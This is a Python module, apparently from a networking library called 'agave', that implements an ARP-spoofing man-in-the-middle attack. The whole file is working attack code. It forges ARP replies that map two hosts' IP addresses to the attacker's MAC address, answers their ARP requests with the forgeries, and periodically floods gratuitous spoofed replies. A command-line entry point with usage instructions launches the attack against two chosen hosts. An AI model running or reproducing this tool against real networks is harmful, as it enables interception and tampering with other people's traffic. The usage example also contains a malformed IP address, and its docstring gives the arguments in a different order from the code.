import time
from typing import Tuple
from agave.frames import ethernet, arp
from agave.frames.ethernet import MACAddress
from agave.nic.interfaces import NetworkInterface
from .utils import ARPReaderLoop, HOST


class MITM(ARPReaderLoop):

	def __init__(
		self,
		interface: NetworkInterface,
		alice: HOST,
		bob: HOST,
		flood_interval: float = 1
	):
		super().__init__(selector_timeout=flood_interval)
		self.message_for_bob = arp.ARP.is_at(
			interface.mac.address, alice[1],
			bob[0].address, bob[1]
		)
		self.message_for_alice = arp.ARP.is_at(
			interface.mac.address, bob[1],
			alice[0].address, alice[1]
		)
		self.gratuitous_timeout = flood_interval
		self.last_gratuitous = time.time()
		self.interface = (interface.name, 1)
		self.bob_ip = bob[1].packed
		self.alice_ip = alice[1].packed

	def send_gratuitous(self):
		self._sock.sendto(self.message_for_bob, self.interface)
		self._sock.sendto(self.message_for_alice, self.interface)
		self.last_gratuitous = time.time()

	def should_send_gratuitous(self):
		return self.gratuitous_timeout < (time.time() - self.last_gratuitous)

	def process(self, address: Tuple, eth: ethernet.Ethernet, frame: arp.ARP):
		if frame.operation == arp.OPERATION_REQUEST:
			# if alice requests bob's mac
			if (frame.target_protocol_address == self.bob_ip and
					frame.sender_protocol_address == self.alice_ip):
				self._sock.sendto(self.message_for_alice, self.interface)
			# if bob requests alice's mac
			elif (frame.target_protocol_address == self.alice_ip and
					frame.sender_protocol_address == self.bob_ip):
				self._sock.sendto(self.message_for_bob, self.interface)

	def after(self):
		if self.should_send_gratuitous():
			self.send_gratuitous()

	def run(self):
		self.send_gratuitous()
		super().run()


if __name__ == "__main__":
	"""
	Man in the middle using ARP reply spoofing.

	Usage:
		python3 -m agave.arp.mitm <interface> <bob IPv4> <alice IPv4>

	Example:
		python3 -m agave.arp.mitm eth0 192.168.1 192.168.1.2

	"""
	import sys
	from ipaddress import IPv4Address
	from agave.nic.interfaces import NetworkInterfaceNotFound
	from agave.arp.resolve import resolve

	
	try:
		print("Resolving addresses ...")
		interface = NetworkInterface.get_by_name(sys.argv[1])
		alice_ip = IPv4Address(sys.argv[2])
		alice_mac = resolve(interface, alice_ip)
		if alice_mac is None:
			print("Unable to resolve mac for {}".format(alice_ip))
			exit(0)
		print("Resolved {} to {}".format(alice_ip, alice_mac))
		bob_ip = IPv4Address(sys.argv[3])
		bob_mac = resolve(interface, bob_ip)
		if bob_mac is None:
			print("Unable to resolve mac for {}".format(bob_ip))
			exit(0)
		print("Resolved {} to {}".format(bob_ip, bob_mac))
		print("Running ...")
		MITM(
			interface,
			(alice_mac, alice_ip),
			(bob_mac, bob_ip)
		).run()
	except NetworkInterfaceNotFound as e:
		print(e)
	except KeyboardInterrupt as e:
		pass
